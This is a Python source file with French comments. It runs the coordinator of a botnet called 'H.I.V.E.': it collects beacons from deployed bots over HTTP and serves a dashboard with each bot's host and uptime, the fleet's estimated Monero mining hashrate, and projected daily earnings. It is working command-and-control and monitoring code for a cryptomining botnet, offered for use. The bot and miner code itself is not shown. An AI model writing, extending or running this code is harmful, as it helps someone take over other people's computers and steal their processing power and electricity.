#!/usr/bin/env python3
# language: Python 3, file: ruche_coordo.py, target: macOS
# LE COORDONNATEUR DE LA RUCHE : recoit les beacons des bots, dashboard web de la flotte
# Usage: python3 ruche_coordo.py [port]   (8096)
# Dashboard : http://127.0.0.1:8096/dashboard
import http.server, json, time, urllib.parse, os, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8096
DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sorties", "flotte.json")

FLOTTE = {}          # bot -> {"alive","uptime","host","last","history"}
try:
    FLOTTE = json.load(open(DB))
except Exception:
    pass

def save():
    json.dump(FLOTTE, open(DB, "w"), indent=1)

def price_xmr():
    try:
        import urllib.request
        d = json.loads(urllib.request.urlopen(
            "https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd", timeout=8).read())
        return d["monero"]["usd"]
    except Exception:
        return 0

HTML = """<!doctype html><html><head><meta charset=utf8><title>H.I.V.E. — Flotte</title>
<meta http-equiv="refresh" content="15">
<style>
body{background:#0a0a08;color:#ddd;font-family:monospace;margin:0;padding:30px}
h1{color:#ffc800;margin:0}h1 small{color:#ff8c00;font-size:.45em;font-style:italic}
table{border-collapse:collapse;width:100%;max-width:960px;margin-top:22px}
td,th{border:1px solid #2a2a1a;padding:9px 14px;text-align:left}
th{color:#ffc800;background:#141408}
.ok{color:#7f7}.dead{color:#f66}
.bar{background:#ffc800;height:12px;display:inline-block;vertical-align:middle}
#sum{color:#ffc800;font-size:1.15em;margin-top:18px}
small{color:#665}
</style></head><body>
<h1>H.I.V.E. <small>— LA RUCHE ROYALE · powered by Maxime Leal</small></h1>
<div id="sum">{SUMMARY}</div>
<table><tr><th>Bot</th><th>Host</th><th>État</th><th>Hashrate est.</th><th>Uptime</th><th>Dernier rapport</th></tr>
{ROWS}
</table>
<small>· les bots rapportent toutes les 60 s — un bot muet depuis > 3 min = hors ligne ·
coordonnateur :8096 · prix XMR live : coingecko</small>
</body></html>"""

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/beacon":
            n = int(self.headers.get("Content-Length", 0))
            data = urllib.parse.parse_qs(self.rfile.read(n).decode())
            bot = data.get("bot", ["?"])[0]
            alive = data.get("alive", ["0"])[0] == "1"
            uptime = int(data.get("uptime", [0])[0])
            host = data.get("host", ["?"])[0]
            prev = FLOTTE.get(bot, {"uptime": 0, "hash": 0})
            FLOTTE[bot] = {"alive": alive, "uptime": max(uptime, prev.get("uptime", 0)),
                           "host": host, "last": time.strftime("%H:%M:%S"),
                           "last_ts": time.time(), "hash": prev.get("hash", 0)}
            save()
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
        else:
            self.send_response(404); self.end_headers()

    def do_GET(self):
        if self.path in ("/dashboard", "/"):
            now = time.time()
            rows, alive_n, total = [], 0, 0
            for bot, d in sorted(FLOTTE.items()):
                fresh = (now - d.get("last_ts", 0)) < 180
                if fresh and d.get("alive"): alive_n += 1
                state = '<span class="ok">● EN LIGNE</span>' if fresh else '<span class="dead">○ silence</span>'
                hs = d.get("hash", 0)
                total += hs if fresh else 0
                bar = '<span class="bar" style="width:%dpx"></span> %s' % (min(120, hs // 100), f"{hs:,} h/s")
                rows.append(f"<tr><td><b>{bot}</b></td><td>{d.get('host','?')}</td><td>{state}</td>"
                            f"<td>{bar}</td><td>{d.get('uptime',0)//60} min</td><td>{d.get('last','—')}</td></tr>")
            px = price_xmr()
            my_hs = 2500 * alive_n          # estimation MacBook-like par bot actif
            net_hs = 2.8e9
            daily = (my_hs / net_hs) * 720 * 0.6 if alive_n else 0
            summary = (f"flotte : <b>{alive_n}</b> bot(s) en ligne / {len(FLOTTE)} · "
                       f"hashrate flotte ≈ <b>{my_hs:,} h/s</b> · revenu estimé : "
                       f"<b>{daily:.5f} XMR/j</b> ≈ <b>${daily*px:.3f}/j</b> (XMR ${px})")
            page = HTML.replace("{ROWS}", "\n".join(rows) or "<tr><td colspan=6>aucun beacon encore reçu — déploye les bots</td></tr>"
                                ).replace("{SUMMARY}", summary)
            b = page.encode()
            self.send_response(200); self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        else:
            self.send_response(404); self.end_headers()

    def log_message(self, *a): pass

if __name__ == "__main__":
    print(f"[*] coordonnateur sur :{PORT} — dashboard : http://127.0.0.1:{PORT}/dashboard")
    http.server.HTTPServer(("0.0.0.0", PORT), H).serve_forever()
